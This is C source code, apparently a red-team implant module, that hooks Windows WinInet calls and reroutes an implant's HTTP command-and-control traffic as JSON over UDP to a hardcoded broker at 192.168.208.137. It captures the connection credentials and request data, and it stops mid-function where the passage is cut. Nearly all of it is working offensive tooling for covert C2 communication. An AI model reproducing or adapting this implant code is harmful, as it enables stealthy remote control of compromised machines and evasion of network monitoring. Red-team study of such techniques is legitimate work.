/*
 * Copyright 2025 Daniel Duggan, Zero-Point Security
 *
 * Redistribution and use in source and binary forms, with or without modification, are
 * permitted provided that the following conditions are met:
 *
 * 1. Redistributions of source code must retain the above copyright notice, this list of
 * conditions and the following disclaimer.
 *
 * 2. Redistributions in binary form must reproduce the above copyright notice, this list of
 * conditions and the following disclaimer in the documentation and/or other materials provided
 * with the distribution.
 *
 * 3. Neither the name of the copyright holder nor the names of its contributors may be used to
 * endorse or promote products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS “AS IS” AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
 * MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
 * COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
 * EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#include <winsock2.h>
#include <windows.h>
#include <heapapi.h>
#include <wininet.h>
#include <string.h>
#include "hook.h"
#include "cfg.h"
#include "tcg.h"


#define BROKER_IP   "192.168.208.137"
#define BROKER_PORT 4446
#define BROKER_TIMEOUT_MS 5000
#define MAX_DATAGRAM_SIZE 65535

/* customCallback specification:

    This is what you modify. You can put any transport you want here.
 */
static char *customCallback(const char *encodedRequest)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD reqLen = encodedRequest ? (DWORD)MSVCRT$strlen(encodedRequest) : 0;
    SOCKET sock = INVALID_SOCKET;
    BOOL wsaStarted = FALSE;
    char *recvBuf = NULL;
    char *responseBuf = NULL;

    if (encodedRequest == NULL || reqLen == 0) {
        MSVCRT$printf("[customCallback] no request data to send\n");
        return NULL;
    }

    WSADATA wsaData;
    int result = WS2_32$WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        MSVCRT$printf("[customCallback] WSAStartup failed: %d\n", result);
        return NULL;
    }

    wsaStarted = TRUE;

    sock = WS2_32$socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        MSVCRT$printf("[customCallback] socket creation failed\n");
        goto cleanup;
    }

    DWORD timeout = BROKER_TIMEOUT_MS;
    WS2_32$setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char *)&timeout, sizeof(timeout));
    WS2_32$setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (const char *)&timeout, sizeof(timeout));

    struct sockaddr_in brokerAddr;
    brokerAddr.sin_family = AF_INET;
    brokerAddr.sin_port   = WS2_32$htons(BROKER_PORT);
    brokerAddr.sin_addr.S_un.S_addr = WS2_32$inet_addr(BROKER_IP);

    if (WS2_32$connect(sock, (SOCKADDR *)&brokerAddr, sizeof(brokerAddr)) == SOCKET_ERROR) {
        MSVCRT$printf("[customCallback] failed to connect to broker %s:%d\n", BROKER_IP, BROKER_PORT);
        goto cleanup;
    }

    DWORD packetLen = sizeof(DWORD) + reqLen;
    char *packet = (char *)KERNEL32$HeapAlloc(hHeap, 0, packetLen);
    if (packet == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for request packet\n");
        goto cleanup;
    }

    memcpy(packet, &reqLen, sizeof(DWORD));
    memcpy(packet + sizeof(DWORD), encodedRequest, reqLen);

    int sent = WS2_32$send(sock, packet, (int)packetLen, 0);
    KERNEL32$HeapFree(hHeap, 0, packet);
    if (sent != (int)packetLen) {
        MSVCRT$printf("[customCallback] failed to send request packet over UDP\n");
        goto cleanup;
    }

    recvBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, MAX_DATAGRAM_SIZE);
    if (recvBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for receive buffer\n");
        goto cleanup;
    }

    int received = WS2_32$recv(sock, recvBuf, MAX_DATAGRAM_SIZE, 0);
    if (received < (int)sizeof(DWORD)) {
        MSVCRT$printf("[customCallback] failed to receive response length over UDP\n");
        goto cleanup;
    }

    DWORD responseLen = 0;
    memcpy(&responseLen, recvBuf, sizeof(DWORD));

    if (responseLen == 0 || responseLen > (DWORD)(received - sizeof(DWORD))) {
        MSVCRT$printf("[customCallback] invalid response length in UDP packet\n");
        goto cleanup;
    }

    responseBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, responseLen + 1);
    if (responseBuf == NULL) {
        MSVCRT$printf("[customCallback] allocation failed for response buffer\n");
        goto cleanup;
    }

    memcpy(responseBuf, recvBuf + sizeof(DWORD), responseLen);
    responseBuf[responseLen] = '\0';

    MSVCRT$printf("[customCallback] received %lu bytes from UDP broker\n", (unsigned long)responseLen);

cleanup:
    if (recvBuf != NULL) {
        KERNEL32$HeapFree(hHeap, 0, recvBuf);
    }
    if (sock != INVALID_SOCKET) {
        WS2_32$closesocket(sock);
    }
    if (wsaStarted) {
        WS2_32$WSACleanup();
    }

    return responseBuf;
}

/* store resolved functions */
void * g_InternetOpenA;
void * g_InternetConnectA;
void * g_HttpOpenRequestA;
void * g_HttpSendRequestA;
void * g_HttpQueryInfoA;
void * g_InternetReadFile;
void * g_InternetQueryDataAvailable;
void * g_CoCreateInstance;
void * g_ExitThread;

/* some globals */
MEMORY_LAYOUT g_layout;

/* patched in from loader.spec */
char xorkey[128] = { 1 };



typedef struct _CONNECTION_CONTEXT {
    HINTERNET hConnect;
    char *    host;
    INTERNET_PORT port;
    struct _CONNECTION_CONTEXT * next;
} CONNECTION_CONTEXT, *PCONNECTION_CONTEXT;

typedef struct _RESPONSE_CACHE {
    DWORD statusCode;
    char *statusText;
    char *headersBlock;
    DWORD headersLength;
    BYTE *body;
    DWORD bodyLength;
    DWORD readOffset;
} RESPONSE_CACHE, *PRESPONSE_CACHE;

typedef struct _REQUEST_CONTEXT {
    HINTERNET hRequest;
    char *method;
    char *scheme;
    char *host;
    INTERNET_PORT port;
    char *path;
    char *headersFromSend;
    RESPONSE_CACHE response;
    struct _REQUEST_CONTEXT * next;
} REQUEST_CONTEXT, *PREQUEST_CONTEXT;

static CRITICAL_SECTION g_ctxLock;
static BOOL g_ctxLockInitialized;
static PCONNECTION_CONTEXT g_connections;
static PREQUEST_CONTEXT g_requests;


static void ensureContextLock(void)
{
    if (g_ctxLockInitialized == FALSE) {
        KERNEL32$InitializeCriticalSection(&g_ctxLock);
        g_ctxLockInitialized = TRUE;
    }
}

static void lockContexts(void)
{
    ensureContextLock();
    if (g_ctxLockInitialized) {
        KERNEL32$EnterCriticalSection(&g_ctxLock);
    }
}

static void unlockContexts(void)
{
    if (g_ctxLockInitialized) {
        KERNEL32$LeaveCriticalSection(&g_ctxLock);
    }
}

static char *dupString(const char *src)
{
    if (src == NULL) {
        return NULL;
    }

    SIZE_T len = MSVCRT$strlen(src);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *dest = (char *)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
    if (dest != NULL) {
        for (SIZE_T i = 0; i <= len; ++i) {
            dest[i] = src[i];
        }
    }
    return dest;
}

static char *jsonEscape(const char *src)
{
    if (src == NULL) {
        return dupString("");
    }

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    SIZE_T len = MSVCRT$strlen(src);
    SIZE_T extra = 0;
    for (SIZE_T i = 0; i < len; ++i) {
        if (src[i] == '"' || src[i] == '\\') {
            extra++;
        }
    }

    char *dest = (char *)KERNEL32$HeapAlloc(hHeap, 0, len + extra + 1);
    if (dest == NULL) {
        return NULL;
    }

    SIZE_T di = 0;
    for (SIZE_T si = 0; si < len; ++si) {
        if (src[si] == '"' || src[si] == '\\') {
            dest[di++] = '\\';
        }
        dest[di++] = src[si];
    }
    dest[di] = '\0';
    return dest;
}

typedef struct _STRING_BUILDER {
    char *data;
    SIZE_T length;
    SIZE_T capacity;
} STRING_BUILDER, *PSTRING_BUILDER;

static BOOL sbEnsure(PSTRING_BUILDER sb, SIZE_T additional)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    SIZE_T required = sb->length + additional + 1;
    if (required <= sb->capacity) {
        return TRUE;
    }

    SIZE_T newCap = sb->capacity == 0 ? 256 : sb->capacity;
    while (newCap < required) {
        newCap *= 2;
    }

    char *newBuf = NULL;
    if (sb->data == NULL) {
        newBuf = (char *)KERNEL32$HeapAlloc(hHeap, 0, newCap);
    }
    else {
        newBuf = (char *)KERNEL32$HeapReAlloc(hHeap, 0, sb->data, newCap);
    }
    if (newBuf == NULL) {
        return FALSE;
    }

    sb->data = newBuf;
    sb->capacity = newCap;
    return TRUE;
}

static BOOL sbAppendChar(PSTRING_BUILDER sb, char c)
{
    if (!sbEnsure(sb, 1)) {
        return FALSE;
    }
    sb->data[sb->length++] = c;
    sb->data[sb->length]   = '\0';
    return TRUE;
}

static BOOL sbAppendStr(PSTRING_BUILDER sb, const char *str)
{
    if (str == NULL) {
        return TRUE;
    }
    SIZE_T len = MSVCRT$strlen(str);
    if (!sbEnsure(sb, len)) {
        return FALSE;
    }
    for (SIZE_T i = 0; i < len; ++i) {
        sb->data[sb->length + i] = str[i];
    }
    sb->length += len;
    sb->data[sb->length] = '\0';
    return TRUE;
}

static const char g_b64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static char *base64Encode(const BYTE *input, DWORD inputLen)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD outputLen = ((inputLen + 2) / 3) * 4;
    char *output = (char *)KERNEL32$HeapAlloc(hHeap, 0, outputLen + 1);
    if (output == NULL) {
        return NULL;
    }

    DWORD j = 0;
    for (DWORD idx = 0; idx < inputLen; idx += 3) {
        BYTE octet_a = input[idx];
        BYTE octet_b = (idx + 1 < inputLen) ? input[idx + 1] : 0;
        BYTE octet_c = (idx + 2 < inputLen) ? input[idx + 2] : 0;

        DWORD triple = (octet_a << 16) | (octet_b << 8) | octet_c;

        output[j++] = g_b64Table[(triple >> 18) & 0x3F];
        output[j++] = g_b64Table[(triple >> 12) & 0x3F];
        output[j++] = (idx + 1 < inputLen) ? g_b64Table[(triple >> 6) & 0x3F] : '=';
        output[j++] = (idx + 2 < inputLen) ? g_b64Table[triple & 0x3F] : '=';
    }

    output[outputLen] = '\0';
    return output;
}

static BYTE decodeValue(char c)
{
    if (c >= 'A' && c <= 'Z') return (BYTE)(c - 'A');
    if (c >= 'a' && c <= 'z') return (BYTE)(c - 'a' + 26);
    if (c >= '0' && c <= '9') return (BYTE)(c - '0' + 52);
    if (c == '+') return 62;
    if (c == '/') return 63;
    if (c == '=') return 0;
    return 0xFF;
}

static BOOL base64Decode(const char *input, BYTE **output, DWORD *outputLen)
{
    if (input == NULL || output == NULL || outputLen == NULL) {
        return FALSE;
    }

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    DWORD len = (DWORD)MSVCRT$strlen(input);
    if (len % 4 != 0) {
        return FALSE;
    }

    DWORD padding = 0;
    if (len >= 1 && input[len - 1] == '=') padding++;
    if (len >= 2 && input[len - 2] == '=') padding++;

    DWORD decodedLen = (len / 4) * 3 - padding;
    BYTE *buffer = (BYTE *)KERNEL32$HeapAlloc(hHeap, 0, decodedLen + 1);
    if (buffer == NULL) {
        return FALSE;
    }

    DWORD i = 0;
    DWORD j = 0;
    while (i < len) {
        BYTE sextet_a = decodeValue(input[i++]);
        BYTE sextet_b = decodeValue(input[i++]);
        BYTE sextet_c = decodeValue(input[i++]);
        BYTE sextet_d = decodeValue(input[i++]);

        DWORD triple = (sextet_a << 18) | (sextet_b << 12) | ((sextet_c & 0x3F) << 6) | (sextet_d & 0x3F);

        if (j < decodedLen) buffer[j++] = (BYTE)((triple >> 16) & 0xFF);
        if (j < decodedLen) buffer[j++] = (BYTE)((triple >> 8) & 0xFF);
        if (j < decodedLen) buffer[j++] = (BYTE)(triple & 0xFF);
    }

    buffer[decodedLen] = '\0';
    *output = buffer;
    *outputLen = decodedLen;
    return TRUE;
}

static PCONNECTION_CONTEXT findConnection(HINTERNET hConnect)
{
    PCONNECTION_CONTEXT current = g_connections;
    while (current != NULL) {
        if (current->hConnect == hConnect) {
            return current;
        }
        current = current->next;
    }
    return NULL;
}

static void addConnection(HINTERNET hConnect, const char *host, INTERNET_PORT port)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PCONNECTION_CONTEXT ctx = (PCONNECTION_CONTEXT)KERNEL32$HeapAlloc(hHeap, 0, sizeof(CONNECTION_CONTEXT));
    if (ctx == NULL) {
        return;
    }

    ctx->hConnect = hConnect;
    ctx->host = dupString(host);
    ctx->port = port;
    ctx->next = g_connections;
    g_connections = ctx;
}

static void freeResponseCache(PRESPONSE_CACHE cache)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (cache->statusText) {
        KERNEL32$HeapFree(hHeap, 0, cache->statusText);
        cache->statusText = NULL;
    }
    if (cache->headersBlock) {
        KERNEL32$HeapFree(hHeap, 0, cache->headersBlock);
        cache->headersBlock = NULL;
    }
    if (cache->body) {
        KERNEL32$HeapFree(hHeap, 0, cache->body);
        cache->body = NULL;
    }
    cache->headersLength = 0;
    cache->bodyLength = 0;
    cache->readOffset = 0;
    cache->statusCode = 0;
}

static PREQUEST_CONTEXT findRequest(HINTERNET hRequest)
{
    PREQUEST_CONTEXT current = g_requests;
    while (current != NULL) {
        if (current->hRequest == hRequest) {
            return current;
        }
        current = current->next;
    }
    return NULL;
}

static void trackRequest(HINTERNET hRequest, const char *method, const char *scheme, const char *host, INTERNET_PORT port, const char *path)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    PREQUEST_CONTEXT ctx = (PREQUEST_CONTEXT)KERNEL32$HeapAlloc(hHeap, 0, sizeof(REQUEST_CONTEXT));
    if (ctx == NULL) {
        return;
    }

    memset(ctx, 0, sizeof(REQUEST_CONTEXT));
    ctx->hRequest = hRequest;
    ctx->method = dupString(method);
    ctx->scheme = dupString(scheme);
    ctx->host = dupString(host);
    ctx->port = port;
    ctx->path = dupString(path);
    ctx->next = g_requests;
    g_requests = ctx;
}

static void updateRequestHeaders(PREQUEST_CONTEXT ctx, const char *headers)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (ctx->headersFromSend != NULL) {
        KERNEL32$HeapFree(hHeap, 0, ctx->headersFromSend);
    }
    ctx->headersFromSend = dupString(headers);
}

static void resetResponseForRequest(PREQUEST_CONTEXT ctx)
{
    freeResponseCache(&ctx->response);
    ctx->response.readOffset = 0;
}

static void splitHeadersIntoJson(PSTRING_BUILDER sb, const char *headers)
{
    sbAppendStr(sb, "\"headers\":[");
    if (headers != NULL && headers[0] != '\0') {
        const char *cursor = headers;
        BOOL first = TRUE;
        while (*cursor != '\0') {
            const char *lineStart = cursor;
            while (*cursor != '\0' && *cursor != '\r' && *cursor != '\n') {
                cursor++;
            }
            SIZE_T lineLen = (SIZE_T)(cursor - lineStart);
            if (lineLen > 0) {
                char *line = (char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, lineLen + 1);
                if (line != NULL) {
                    for (SIZE_T i = 0; i < lineLen; ++i) {
                        line[i] = lineStart[i];
                    }
                    line[lineLen] = '\0';
                    char *escaped = jsonEscape(line);
                    if (escaped != NULL) {
                        if (!first) sbAppendStr(sb, ",");
                        sbAppendStr(sb, "\"");
                        sbAppendStr(sb, escaped);
                        sbAppendStr(sb, "\"");
                        first = FALSE;
                        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, escaped);
                    }
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, line);
                }
            }
            while (*cursor == '\r' || *cursor == '\n') {
                cursor++;
            }
        }
    }
    sbAppendStr(sb, "]");
}

static char *buildRequestJson(PREQUEST_CONTEXT ctx, const char *headers, const BYTE *body, DWORD bodyLen)
{
    STRING_BUILDER sb;
    memset(&sb, 0, sizeof(sb));

    sbEnsure(&sb, 256);
    sbAppendChar(&sb, '{');

    char *escapedMethod = jsonEscape(ctx && ctx->method ? ctx->method : "");
    char *escapedScheme = jsonEscape(ctx && ctx->scheme ? ctx->scheme : "");
    char *escapedHost   = jsonEscape(ctx && ctx->host ? ctx->host : "");
    char *escapedPath   = jsonEscape(ctx && ctx->path ? ctx->path : "");

    sbAppendStr(&sb, "\"method\":\"");
    sbAppendStr(&sb, escapedMethod ? escapedMethod : "");
    sbAppendStr(&sb, "\",\"scheme\":\"");
    sbAppendStr(&sb, escapedScheme ? escapedScheme : "");
    sbAppendStr(&sb, "\",\"host\":\"");
    sbAppendStr(&sb, escapedHost ? escapedHost : "");
    sbAppendStr(&sb, "\",\"port\":");

    char portBuf[16];
    int portLen = MSVCRT$sprintf(portBuf, "%hu", ctx ? ctx->port : 0);
    for (int i = 0; i < portLen; ++i) {
        sbAppendChar(&sb, portBuf[i]);
    }

    sbAppendStr(&sb, ",\"path\":\"");
    sbAppendStr(&sb, escapedPath ? escapedPath : "");
    sbAppendStr(&sb, "\",");

    splitHeadersIntoJson(&sb, headers);
    sbAppendStr(&sb, ",\"body\":\"");

    char *bodyB64 = base64Encode(body, bodyLen);
    if (bodyB64 != NULL) {
        sbAppendStr(&sb, bodyB64);
    }
    sbAppendStr(&sb, "\"}");

    HANDLE hHeap = KERNEL32$GetProcessHeap();
    if (escapedMethod) KERNEL32$HeapFree(hHeap, 0, escapedMethod);
    if (escapedScheme) KERNEL32$HeapFree(hHeap, 0, escapedScheme);
    if (escapedHost)   KERNEL32$HeapFree(hHeap, 0, escapedHost);
    if (escapedPath)   KERNEL32$HeapFree(hHeap, 0, escapedPath);
    if (bodyB64)       KERNEL32$HeapFree(hHeap, 0, bodyB64);

    return sb.data;
}


static DWORD parseJsonNumber(const char *json, const char *key, BOOL *found)
{
    if (found) {
        *found = FALSE;
    }
    if (json == NULL || key == NULL) {
        return 0;
    }

    char pattern[64];
    int patLen = MSVCRT$sprintf(pattern, "\"%s\"", key);
    const char *loc = MSVCRT$strstr(json, pattern);
    if (loc == NULL) {
        return 0;
    }

    loc += patLen;
    while (*loc == ' ' || *loc == '\t' || *loc == '\r' || *loc == '\n') {
        loc++;
    }
    if (*loc != ':') {
        return 0;
    }
    loc++;
    while (*loc == ' ' || *loc == '\t') {
        loc++;
    }

    DWORD value = 0;
    while (*loc >= '0' && *loc <= '9') {
        value = value * 10 + (DWORD)(*loc - '0');
        loc++;
    }

    if (found) {
        *found = TRUE;
    }
    return value;
}

static char *parseJsonString(const char *json, const char *key)
{
    if (json == NULL || key == NULL) {
        return NULL;
    }

    char pattern[64];
    int patLen = MSVCRT$sprintf(pattern, "\"%s\"", key);
    const char *loc = MSVCRT$strstr(json, pattern);
    if (loc == NULL) {
        return NULL;
    }

    loc += patLen;
    while (*loc == ' ' || *loc == '\t' || *loc == '\r' || *loc == '\n') {
        loc++;
    }
    if (*loc != ':') {
        return NULL;
    }
    loc++;
    while (*loc == ' ' || *loc == '\t') {
        loc++;
    }
    if (*loc != '"') {
        return NULL;
    }
    loc++;

    const char *start = loc;
    while (*loc != '\0' && *loc != '"') {
        loc++;
    }

    SIZE_T len = (SIZE_T)(loc - start);
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    char *out = (char *)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
    if (out == NULL) {
        return NULL;
    }

    for (SIZE_T i = 0; i < len; ++i) {
        out[i] = start[i];
    }
    out[len] = '\0';
    return out;
}

static char *parseHeadersArray(const char *json)
{
    if (json == NULL) {
        return NULL;
    }

    const char *key = "\"headers\"";
    const char *loc = MSVCRT$strstr(json, key);
    if (loc == NULL) {
        return NULL;
    }

    loc += MSVCRT$strlen(key);
    while (*loc == ' ' || *loc == '\t' || *loc == '\r' || *loc == '\n') loc++;
    if (*loc != ':') return NULL;
    loc++;
    while (*loc == ' ' || *loc == '\t') loc++;
    if (*loc != '[') return NULL;
    loc++;

    STRING_BUILDER sb;
    memset(&sb, 0, sizeof(sb));
    BOOL first = TRUE;
    while (*loc != '\0' && *loc != ']') {
        while (*loc == ' ' || *loc == '\t' || *loc == '\r' || *loc == '\n' || *loc == ',') {
            loc++;
        }
        if (*loc == '"') {
            loc++;
            const char *start = loc;
            while (*loc != '\0' && *loc != '"') {
                loc++;
            }
            SIZE_T len = (SIZE_T)(loc - start);
            if (len > 0) {
                if (!first) {
                    sbAppendStr(&sb, "\r\n");
                }
                first = FALSE;
                char *line = (char *)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), 0, len + 1);
                if (line != NULL) {
                    for (SIZE_T i = 0; i < len; ++i) {
                        line[i] = start[i];
                    }
                    line[len] = '\0';
                    sbAppendStr(&sb, line);
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, line);
                }
            }
            if (*loc == '"') loc++;
        }
        else {
            loc++;
        }
    }

    return sb.data;
}

static BOOL populateResponseFromJson(PREQUEST_CONTEXT ctx, const char *json)
{
    if (ctx == NULL || json == NULL) {
        return FALSE;
    }

    resetResponseForRequest(ctx);
    BOOL foundStatus = FALSE;
    ctx->response.statusCode = parseJsonNumber(json, "status_code", &foundStatus);
    ctx->response.statusText = parseJsonString(json, "status_text");
    ctx->response.headersBlock = parseHeadersArray(json);
    if (ctx->response.headersBlock != NULL) {
        ctx->response.headersLength = (DWORD)MSVCRT$strlen(ctx->response.headersBlock);
    }

    char *bodyB64 = parseJsonString(json, "body");
    if (bodyB64 != NULL) {
        BYTE *bodyBuf = NULL;
        DWORD bodyLen = 0;
        if (base64Decode(bodyB64, &bodyBuf, &bodyLen)) {
            ctx->response.body = bodyBuf;
            ctx->response.bodyLength = bodyLen;
        }
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, bodyB64);
    }



    return foundStatus;
}



/*
 * Capture the parameters when WinInet is initialized so we can track every
 * logical connection. The custom broker depends on this metadata to build
 * request blobs later, so we copy the strings before handing control back to
 * the original InternetOpenA implementation stored in g_InternetOpenA.
 */
HINTERNET WINAPI _InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)
{
    HANDLE hHeap          = KERNEL32$GetProcessHeap();
    LPCSTR lpszAgentLocal = lpszAgent;
    LPCSTR lpszProxyLocal = lpszProxy;
    LPCSTR lpszProxyByLocal = lpszProxyBypass;
    SIZE_T len;
    SIZE_T i;

    LPSTR agentCopy = NULL;
    LPSTR proxyCopy = NULL;
    LPSTR proxyBypassCopy = NULL;

    if (lpszAgentLocal != NULL) {
        len = MSVCRT$strlen(lpszAgentLocal);
        agentCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (agentCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                agentCopy[i] = lpszAgentLocal[i];
            }
        }
    }

    if (lpszProxyLocal != NULL) {
        len = MSVCRT$strlen(lpszProxyLocal);
        proxyCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (proxyCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                proxyCopy[i] = lpszProxyLocal[i];
            }
        }
    }

    if (lpszProxyByLocal != NULL) {
        len = MSVCRT$strlen(lpszProxyByLocal);
        proxyBypassCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (proxyBypassCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                proxyBypassCopy[i] = lpszProxyByLocal[i];
            }
        }
    }

    //MSVCRT$printf("[hook] InternetOpenA called!\n");

    typedef HINTERNET (WINAPI *PFN_INTERNETOPENA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    PFN_INTERNETOPENA fnInternetOpenA = (PFN_INTERNETOPENA)g_InternetOpenA;
    HINTERNET result = NULL;
    if (fnInternetOpenA != NULL) {
        result = fnInternetOpenA(agentCopy, dwAccessType, proxyCopy, proxyBypassCopy, dwFlags);
    }

    if (agentCopy != NULL) {
        KERNEL32$HeapFree(hHeap, 0, agentCopy);
    }

    if (proxyCopy != NULL) {
        KERNEL32$HeapFree(hHeap, 0, proxyCopy);
    }

    if (proxyBypassCopy != NULL) {
        KERNEL32$HeapFree(hHeap, 0, proxyBypassCopy);
    }

    return result;
}


/*
 * Hook the connection handshake to stash the server/port information inside
 * the connection list. That way HttpOpenRequestA can look up the host for the
 * JSON payload that gets sent off to customCallback.
 */
HINTERNET WINAPI _InternetConnectA(
    HINTERNET     hInternet,
    LPCSTR        lpszServerName,
    INTERNET_PORT nServerPort,
    LPCSTR        lpszUserName,
    LPCSTR        lpszPassword,
    DWORD         dwService,
    DWORD         dwFlags,
    DWORD_PTR     dwContext
)
{
    // Heap copies of string arguments (avoid stack/VLA/_alloca → no ___chkstk_ms)
    LPSTR serverNameCopy  = NULL;
    LPSTR userNameCopy    = NULL;
    LPSTR passwordCopy    = NULL;
    SIZE_T len;
    SIZE_T i;
    HANDLE hHeap = KERNEL32$GetProcessHeap();

    if (lpszServerName != NULL) {
        len = MSVCRT$strlen(lpszServerName);
        serverNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (serverNameCopy != NULL) {
            for (i = 0; i <= len; ++i) {      // includes '\0'
                serverNameCopy[i] = lpszServerName[i];
            }
        }
    }

    if (lpszUserName != NULL) {
        len = MSVCRT$strlen(lpszUserName);
        userNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (userNameCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                userNameCopy[i] = lpszUserName[i];
            }
        }
    }

    if (lpszPassword != NULL) {
        len = MSVCRT$strlen(lpszPassword);
        passwordCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (passwordCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                passwordCopy[i] = lpszPassword[i];
            }
        }
    }

    //MSVCRT$printf("[hook] InternetConnectA called!\n");

    typedef HINTERNET (WINAPI *PFN_INTERNETCONNECTA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    PFN_INTERNETCONNECTA fnInternetConnectA = (PFN_INTERNETCONNECTA)g_InternetConnectA;
    HINTERNET result = NULL;
    if (fnInternetConnectA != NULL) {
        result = fnInternetConnectA(hInternet, serverNameCopy, nServerPort, userNameCopy, passwordCopy, dwService, dwFlags, dwContext);
    }


    if (result != NULL) {
        lockContexts();
        addConnection(result, lpszServerName, nServerPort);
        unlockContexts();
    }

    if (serverNameCopy) KERNEL32$HeapFree(hHeap, 0, serverNameCopy);
    if (userNameCopy)   KERNEL32$HeapFree(hHeap, 0, userNameCopy);
    if (passwordCopy)   KERNEL32$HeapFree(hHeap, 0, passwordCopy);

    return result;
}

/*
 * Replace HttpOpenRequestA so we can tag each request with the correct verb,
 * path, and scheme before it reaches the broker. The stored connection info
 * lets us enrich the serialized payload with host/port context.
 */
HINTERNET WINAPI _HttpOpenRequestA(
    HINTERNET  hConnect,
    LPCSTR     lpszVerb,
    LPCSTR     lpszObjectName,
    LPCSTR     lpszVersion,
    LPCSTR     lpszReferrer,
    LPCSTR   * lplpszAcceptTypes,
    DWORD      dwFlags,
    DWORD_PTR  dwContext
)
{
    HANDLE hHeap = KERNEL32$GetProcessHeap();
    LPSTR  verbCopy = NULL;
    LPSTR  objectNameCopy = NULL;
    LPSTR  versionCopy = NULL;
    LPSTR  referrerCopy = NULL;
    SIZE_T len;
    SIZE_T i;

    if (lpszVerb != NULL) {
        len = MSVCRT$strlen(lpszVerb);
        verbCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (verbCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                verbCopy[i] = lpszVerb[i];
            }
        }
    }

    if (lpszObjectName != NULL) {
        len = MSVCRT$strlen(lpszObjectName);
        objectNameCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (objectNameCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                objectNameCopy[i] = lpszObjectName[i];
            }
        }
    }

    if (lpszVersion != NULL) {
        len = MSVCRT$strlen(lpszVersion);
        versionCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (versionCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                versionCopy[i] = lpszVersion[i];
            }
        }
    }

    if (lpszReferrer != NULL) {
        len = MSVCRT$strlen(lpszReferrer);
        referrerCopy = (LPSTR)KERNEL32$HeapAlloc(hHeap, 0, len + 1);
        if (referrerCopy != NULL) {
            for (i = 0; i <= len; ++i) {
                referrerCopy[i] = lpszReferrer[i];
            }
        }
    }

    //MSVCRT$printf("[hook] HttpOpenRequestA called!\n");

    typedef HINTERNET (WINAPI *PFN_HTTPOPENREQUESTA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR *, DWORD, DWORD_PTR);
    PFN_HTTPOPENREQUESTA fnHttpOpenRequestA = (PFN_HTTPOPENREQUESTA)g_HttpOpenRequestA;
    HINTERNET result = NULL;
    if (fnHttpOpenRequestA != NULL) {
        result = fnHttpOpenRequestA(hConnect, verbCopy, objectNameCopy, versionCopy, referrerCopy, lplpszAcceptTypes, dwFlags, dwContext);
    }


    if (result != NULL) {
        lockContexts();
